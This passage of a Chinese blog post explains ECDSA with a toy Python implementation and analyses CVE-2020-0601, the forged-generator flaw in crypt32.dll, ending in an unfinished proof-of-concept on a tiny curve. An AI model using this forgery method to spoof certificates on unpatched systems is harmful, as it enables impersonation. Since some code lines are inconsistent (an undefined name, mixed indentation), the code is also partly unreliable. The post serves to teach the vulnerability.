    
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# generate signature&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - hashval: hash value of message as int&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - priv: priv key as int&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - r: random int &lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - returns: signature as (int, int)&lt;/span&gt;
    
        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;R&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# (R.x, S)	S = r^-1 * (hashval + R.x * k)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hashval&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;validate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# validate signature&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - hashval: hash value of message as int&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - sig: signature as (int, int)&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - pub: pub key as a point on ec&lt;/span&gt;
        
        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_valid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zero&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# w = S^-1&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;u1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashval&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们跑一下下面这段代码试试：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vm&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# shared elliptic curve system of examples&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;# ECDSA usage&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;dsa&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	
		&lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;hashval&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dsa&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hashval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;sig&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dsa&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;validate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hashval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;Success!&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-71f7bdac868a1cebf7eefba756e78187_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;519&quot; data-rawheight=&quot;100&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;519&quot; data-original=&quot;https://pic4.zhimg.com/v2-71f7bdac868a1cebf7eefba756e78187_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-71f7bdac868a1cebf7eefba756e78187_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;519&quot; data-rawheight=&quot;100&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;519&quot; data-original=&quot;https://pic4.zhimg.com/v2-71f7bdac868a1cebf7eefba756e78187_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-71f7bdac868a1cebf7eefba756e78187_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;我们可以看到已经验证成功了。&lt;/p&gt;&lt;h2&gt;CVE-2020-0601分析&lt;/h2&gt;&lt;p&gt;终于到了分析漏洞的时候了，这个漏洞导致的原因其实很简单，我们注意到在生成公钥的一部分`Q = k*G`的时候k我们是不知到的，而且求解难度很大。但是我们在签名的时候需要用私钥签名，怎么伪造签名呢？假如在对公钥做校验的时候我们没有检测G的值，只检查了Q那么我么就可以假装我们知道私钥。此时：&lt;/p&gt;&lt;p&gt;&lt;b&gt;这里的e是乘法单位元，相当于整数乘法里的1&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Q = k*G&lt;/li&gt;&lt;li&gt;Q&amp;#39; = e*Q = Q&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;也就是说，我可以直接把“**1**”作为私钥，然后再去签名:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;公钥：(Q, G)&lt;/li&gt;&lt;li&gt;原签名：(R.x，S)&lt;/li&gt;&lt;/ul&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Q = k*G
R = r*Q
S = r^{-1} *(hash + R.x*k)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;伪造公钥：(Q&amp;#39;，G&amp;#39;)&lt;/li&gt;&lt;li&gt;伪造签名：(R&amp;#39;.x, S&amp;#39;)&lt;/li&gt;&lt;/ul&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Q&amp;#39; = 1*Q = Q
R&amp;#39; = r*Q&amp;#39; = r*Q
S&amp;#39; = r^{-1} *(hash + R&amp;#39;.x*1)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;那么我们来分析验证过程：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;P = S^{-1} *hash*G + S^{-1} *R.x*Q&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;假如我们把S‘和R‘.x以及公钥(G&amp;#39;, Q)代入后可以得到&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;S’^{-1} = r*(hash + Q.x)^{-1}
P = S&amp;#39;^{-1}*(hash*Q + Q.x*Q)
进一步代入S^-1得：
P = r*(hash + Q.x)^{-1} * (hash + Q.x)*Q = r*Q = R&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们看到验证通过。系统在验证公钥得生成元Q == Q‘之后，并没有进一步验证生成元G。这就是**CVE-2020-0601**漏洞利用的原理，crypt32.dll在做校验时，只检查了Q，因此我们用单位元伪造私钥后进行的签名会被验证通过。&lt;/p&gt;&lt;p&gt;下面我们写个脚本验证一下：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vm&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# shared elliptic curve system of examples&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# ECDSA usage&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dsa&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# G&amp;#39; = Q = k*G&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fake&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# print(g, ec.mul(g, 1))&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;# R‘ = r*Q’ = 1 * Q = Q&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 因此fake_pub = pub&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fake_pub&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;fake_pub&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_pub&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;pub&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;hashval&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# 随机数r设置为不同的值&lt;/span&gt;
